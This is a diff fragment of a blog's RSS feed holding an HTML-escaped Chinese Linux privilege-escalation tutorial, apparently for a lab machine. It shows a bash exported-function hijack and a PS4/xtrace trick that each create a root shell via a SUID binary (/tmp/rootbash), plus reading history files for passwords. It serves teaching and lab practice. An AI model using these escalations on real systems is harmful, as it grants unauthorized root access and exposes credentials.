+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/lib64/ld-linux-x86-64.so.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__gmon_start__
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc.so.6
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;setresgid
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;setresuid
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__libc_start_main
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GLIBC_2.2.5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fff.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fffff.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;l$ L
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;L
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|$0H
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin/service apache2 start
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# /bin/bash --version
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GNU bash, version 4.1.5&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;-release &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;x86_64-pc-linux-gnu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Copyright &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;C&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2009&lt;/span&gt; Free Software Foundation, Inc.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;License GPLv3+: GNU GPL version &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;This is free software; you are free to change and redistribute it.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;There is NO WARRANTY, to the extent permitted by law.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; /usr/sbin/service &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; /bin/bash -p; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# export -f /usr/sbin/service
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# /usr/local/bin/suid-env2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;suid--sgid-可执行文件滥用-shell-特性2&#34;&gt;SUID / SGID 可执行文件——滥用 Shell 特性（#2）&lt;/h2&gt;
+&lt;p&gt;注意：这不适用于 Bash 4.4 及更高版本。&lt;/p&gt;
+&lt;p&gt;在调试模式下，Bash 使用环境变量&lt;strong&gt;PS4&lt;/strong&gt;来显示调试语句的额外提示。&lt;/p&gt;
+&lt;p&gt;在启用 bash 调试的情况下运行**/usr/local/bin/suid-env2**可执行文件，并将 PS4 变量设置为创建 SUID 版本 /bin/bash 的嵌入式命令：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39; /usr/local/bin/suid-env2&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;/tmp/rootbash -p&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# env -i SHELLOPTS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;xtrace PS4&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&amp;#39;&lt;/span&gt; /usr/local/bin/suid-env2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin/service apache2 start
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;basename /usr/sbin/service
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;VERSION&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;service ver. 0.91-ubuntu1&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;basename /usr/sbin/service
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;USAGE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Usage: service &amp;lt; option &amp;gt; | --status-all | [ service_name [ command | --full-restart ] ]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SERVICE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ACTION&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SERVICEDIR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/init.d
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;OPTIONS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; -gt &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;1&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; in
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -a &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -a apache2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; --status-all &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; -a start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; --full-restart &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SERVICE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;apache2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shift
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -gt &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;1&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; in
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; -z apache2 -a &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -a start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; --status-all &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; -a &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; --full-restart &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; -z apache2 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; -z &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ACTION&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;start
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shift
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -gt &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; -r /etc/init/apache2.conf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[&amp;#39;&lt;/span&gt; -x /etc/init.d/apache2 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;]&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exec env -i LANG&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;dumb /etc/init.d/apache2 start
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting web server: apache2httpd &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;pid 1728&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; already running
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# /tmp/rootbash -p
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x8-密码和密钥&#34;&gt;0x8 密码和密钥&lt;/h1&gt;
+&lt;p&gt;如果用户不小心在命令行而不是在密码提示中输入密码，则可能会记录在历史文件中。&lt;/p&gt;
+&lt;p&gt;查看用户家目录下所有隐藏历史文件的内容：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;cat ~/.*history | less&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;‍&lt;/p&gt;
+&lt;p&gt;‍&lt;/p&gt;
+&lt;p&gt;‍&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
       <title>Mrrobot-Easy</title>
       <link>/tryhackme/mr.robot-easy/</link>
       <pubDate>Tue, 13 Dec 2022 12:02:03 -0500</pubDate>
